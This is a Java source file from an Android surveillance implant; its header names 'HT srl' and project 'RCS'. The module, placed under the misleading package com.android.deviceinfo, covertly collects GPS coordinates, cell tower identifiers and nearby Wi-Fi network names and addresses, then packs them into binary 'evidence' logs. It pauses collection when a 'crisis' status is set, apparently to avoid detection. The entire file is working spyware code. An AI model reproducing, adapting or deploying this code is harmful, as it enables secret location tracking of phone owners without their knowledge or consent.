/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentPosition.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.util.Date;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;

import com.android.deviceinfo.CellInfo;
import com.android.deviceinfo.Device;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.interfaces.IncrementalLog;
import com.android.deviceinfo.module.position.GPSLocationListener;
import com.android.deviceinfo.module.position.GPSLocatorAuto;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DataBuffer;
import com.android.deviceinfo.util.DateTime;

public class ModulePosition extends BaseInstantModule implements GPSLocationListener {
	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
	private static final int TYPE_GPS = 1;
	private static final int TYPE_CELL = 2;
	private static final int TYPE_WIFI = 4;

	private static final int LOG_TYPE_GPS = 1;
	private static final int LOG_TYPE_GSM = 2;
	private static final int LOG_TYPE_WIFI = 3;
	private static final int LOG_TYPE_IP = 4;
	private static final int LOG_TYPE_CDMA = 5;
	private static final long POSITION_DELAY = 100;

	private boolean gpsEnabled;
	private boolean cellEnabled;
	private boolean wifiEnabled;

	int period;

	private Object position = new Object();
	private boolean scanning;

	@Override
	public boolean parse(ConfModule conf) {

		try {
			gpsEnabled = conf.getBoolean("gps");
			cellEnabled = conf.getBoolean("cell");
			wifiEnabled = conf.getBoolean("wifi");
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
		}

		setPeriod(NEVER);
		setDelay(POSITION_DELAY);

		return true;
	}

	@Override
	public void actualStart() {
		if (Status.self().crisisPosition()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
			}

			return;
		}

		if (gpsEnabled) {
			locationGPS();
		}

		if (cellEnabled) {
			locationCELL();
		}

		if (wifiEnabled) {
			locationWIFI();
		}
	}

	private void locationWIFI() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (locationWIFI)");
		}
		final WifiManager wifiManager = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
		if (wifiManager != null && wifiManager.isWifiEnabled()) {
			registerWifiScan(wifiManager);
			wifiManager.startScan();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Wifi disabled");//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
	}

	private void locationGPS() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (locationGPS)");
		}

		GPSLocatorAuto.self().start(this);
	}

	/**
	 * http://stackoverflow.com/questions/3868223/problem-with-
	 * neighboringcellinfo-cid-and-lac
	 */
	private void locationCELL() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (locationCELL)");
		}
		final CellInfo info = Device.getCellInfo();
		if (!info.valid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		synchronized (position) {
			if (info.gsm) {
				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
						LOG_TYPE_GSM));
				logCell.write(getCellPayload(info, LOG_TYPE_GSM));
				logCell.close();

			} else if (info.cdma) {
				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
						LOG_TYPE_CDMA));
				logCell.write(getCellPayload(info, LOG_TYPE_CDMA));
				logCell.close();

			}
		}

	}

	@Override
	public void onLocationChanged(Location location) {
		if (location == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " location is null");
			}

			return;
		}

		final double lat = location.getLatitude();
		final double lng = location.getLongitude();

		if (Cfg.DEBUG) {
			Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
		}

		synchronized (position) {
			final long timestamp = location.getTime();

			if (Cfg.DEBUG) {
				Check.log(TAG + " valid");//$NON-NLS-1$
			}

			byte[] payload = getGPSPayload(location, timestamp);

			EvidenceReference logGPS = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
					LOG_TYPE_GPS));
			logGPS.write(payload);

			logGPS.close();

		}
	}

	public void onWifiScan(List<ScanResult> results) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onWifiScan)");
		}

		if (wifiReceiver != null) {
			Status.getAppContext().unregisterReceiver(wifiReceiver);
		}

		synchronized (position) {
			EvidenceReference logWifi = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(
					results.size(), LOG_TYPE_WIFI));

			for (ScanResult wifi : results) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: " + "Wifi: " + wifi.BSSID);//$NON-NLS-1$ //$NON-NLS-2$
				}

				final byte[] payload = getWifiPayload(wifi.BSSID, wifi.SSID, wifi.level);
				logWifi.write(payload);
			}

			logWifi.close();
		}
	}

	private byte[] getAdditionalData(int structNum, int type) {

		final int addsize = 12;
		final byte[] additionalData = new byte[addsize];
		final DataBuffer addbuffer = new DataBuffer(additionalData, 0, additionalData.length);
		final int version = 2010082401;

		addbuffer.writeInt(version);
		addbuffer.writeInt(type);
		addbuffer.writeInt(structNum);

		if (Cfg.DEBUG) {
			Check.ensures(addbuffer.getPosition() == addsize, "addbuffer wrong size"); //$NON-NLS-1$
		}

		return additionalData;
	}

	private byte[] messageEvidence(byte[] payload, int type) {

		if (Cfg.DEBUG) {
			Check.requires(payload != null, "saveEvidence payload!= null"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " saveEvidence payload: " + payload.length);//$NON-NLS-1$
		}

		final int version = 2008121901;
		final Date date = new Date();
		final int payloadSize = payload.length;
		final int size = payloadSize + 24;

		final byte[] message = new byte[size];

		final DataBuffer databuffer = new DataBuffer(message, 0, size);

		databuffer.writeInt(type);

		// header
		databuffer.writeInt(size);
		databuffer.writeInt(version);
		databuffer.writeLong(DateTime.getFiledate(date));

		// payload
		databuffer.write(payload);

		// delimiter
		databuffer.writeInt(EvidenceReference.E_DELIMITER);

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size"); //$NON-NLS-1$
		}

		// save log

		return message;

	}

	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid + " signal:" + signalLevel);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
		final int size = 48;
		final byte[] payload = new byte[size];

		final DataBuffer databuffer = new DataBuffer(payload, 0, payload.length);

		for (int i = 0; i < 6; i++) {
			final byte[] token = ByteArray.hexStringToByteArray(bssid, i * 3, 2);

			// debug.trace("getWifiPayload " + i + " : "
			// + ByteArray.byteArrayToHex(token));

			if (Cfg.DEBUG) {
				Check.asserts(token.length == 1, "getWifiPayload: token wrong size"); //$NON-NLS-1$
			}

			databuffer.writeByte(token[0]);
		}

		// PAD
		databuffer.writeByte((byte) 0);
		databuffer.writeByte((byte) 0);

		final byte[] ssidcontent = ssid.getBytes();
		final int len = ssidcontent.length;
		final byte[] place = new byte[32];

		for (int i = 0; i < (Math.min(32, len)); i++) {
			place[i] = ssidcontent[i];
		}

		if (Cfg.DEBUG) {
			//Check.log(TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);//$NON-NLS-1$
		}

		databuffer.writeInt(ssidcontent.length);
		databuffer.write(place);
		databuffer.writeInt(signalLevel);

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "databuffer.getPosition wrong size"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.ensures(payload.length == size, "payload wrong size"); //$NON-NLS-1$
		}

		return payload;
		// return messageEvidence(payload,LOG_TYPE_WIFI);
	}

	private byte[] getCellPayload(CellInfo info, int logType) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " getCellPayload");
			Check.requires(info.valid, "invalid cell info"); //$NON-NLS-1$
		}

		final int size = 19 * 4 + 48 + 16;
		final byte[] cellPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(cellPosition, 0, cellPosition.length);

		databuffer.writeInt(size); // size
		databuffer.writeInt(0); // params

		databuffer.writeInt(info.mcc); //
		databuffer.writeInt(info.mnc); //
		databuffer.writeInt(info.lac); //
		databuffer.writeInt(info.cid); //

		databuffer.writeInt(0); // bsid
		databuffer.writeInt(0); // bcc

		databuffer.writeInt(info.rssi); // rx level
		databuffer.writeInt(0); // rx level full
		databuffer.writeInt(0); // rx level sub

		databuffer.writeInt(0); // rx quality
		databuffer.writeInt(0); // rx quality full
		databuffer.writeInt(0); // rx quality sub

		databuffer.writeInt(0); // idle timeslot
		databuffer.writeInt(0); // timing advance
		databuffer.writeInt(0); // gprscellid
		databuffer.writeInt(0); // gprs basestationid
		databuffer.writeInt(0); // num bcch

		databuffer.write(new byte[48]); // BCCH
		databuffer.write(new byte[16]); // NMR

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "getCellPayload wrong size"); //$NON-NLS-1$
		}

		return messageEvidence(cellPosition, logType);

	}

	/**
	 * @param timestamp
	 * @param accuracy
	 */
	private byte[] getGPSPayload(Location loc, long timestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " getGPSPayload");//$NON-NLS-1$
		}

		final Date date = new Date(timestamp);

		final double latitude = loc.getLatitude();
		final double longitude = loc.getLongitude();
		final double altitude = loc.getAltitude();
		final float hdop = loc.getAccuracy();
		final float vdop = 100;
		final float speed = loc.getSpeed();
		final float course = loc.getBearing();

		if (Cfg.DEBUG) {
			Check.log(TAG
					+ " " + " " + speed + " m/s |" + latitude + " , " + longitude + "|" + hdop + " m |" + course + " o |" + date);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
		}

		final DateTime dateTime = new DateTime(date);

		// define GPS_VALID_UTC_TIME 0x00000001
		// define GPS_VALID_LATITUDE 0x00000002
		// define GPS_VALID_LONGITUDE 0x00000004
		// define GPS_VALID_SPEED 0x00000008
		// define GPS_VALID_HEADING 0x00000010
		// define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION 0x00000200
		// define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION 0x00000400
		final int validFields = 0x00000400 | 0x00000200 | 0x00000010 | 0x00000008 | 0x00000004 | 0x00000002
				| 0x00000001;

		final int size = 344;
		// struct GPS_POSITION
		final byte[] gpsPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0, gpsPosition.length);

		// struct GPS_POSITION
		databuffer.writeInt(0); // version
		databuffer.writeInt(size); // sizeof GPS_POSITION == 344
		databuffer.writeInt(validFields); // validFields
		databuffer.writeInt(0); // flags

		// ** Time related : 16 bytes
		databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

		// ** Position + heading related
		databuffer.writeDouble(latitude); // latitude
		databuffer.writeDouble(longitude); // longitude
		databuffer.writeFloat(speed); // speed
		databuffer.writeFloat(course); // heading
		databuffer.writeDouble(0); // Magnetic variation
		databuffer.writeFloat((float) altitude); // altitude
		databuffer.writeFloat(0); // altitude ellipsoid

		// ** Quality of this fix
		databuffer.writeInt(1); // GPS_FIX_QUALITY GPS
		databuffer.writeInt(2); // GPS_FIX_TYPE 3D
		databuffer.writeInt(0); // GPS_FIX_SELECTION
		databuffer.writeFloat(200); // PDOP
		databuffer.writeFloat(hdop); // HDOP
		databuffer.writeFloat(vdop); // VDOP

		// ** Satellite information
		databuffer.writeInt(0); // satellite used
		databuffer.write(new byte[48]); // prn used 12 int
		databuffer.writeInt(0); // satellite view
		databuffer.write(new byte[48]); // prn view
		databuffer.write(new byte[48]); // elevation in view
		databuffer.write(new byte[48]); // azimuth view
		databuffer.write(new byte[48]); // sn view

		if (Cfg.DEBUG) {
			Check.log(TAG + " len: " + databuffer.getPosition());//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "saveGPSLog wrong size: " + databuffer.getPosition()); //$NON-NLS-1$
		}

		return messageEvidence(gpsPosition, LOG_TYPE_GPS);

	}

	BroadcastReceiver wifiReceiver = null;

	public void registerWifiScan(final WifiManager wifiManager) {
		if (scanning) {
			return;
		}
		scanning = true;
		if (Cfg.DEBUG) {
			Check.log(TAG + " (registerWifi)");
		}
		final IntentFilter scanFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
		wifiReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				try {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onReceive)");
					}
					scanning = false;

					List<ScanResult> results = wifiManager.getScanResults();
					onWifiScan(results);
				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " ERROR: (onReceive) " + ex);
					}
				}
			}
		};

		Status.getAppContext().registerReceiver(wifiReceiver, scanFilter);
	}
}
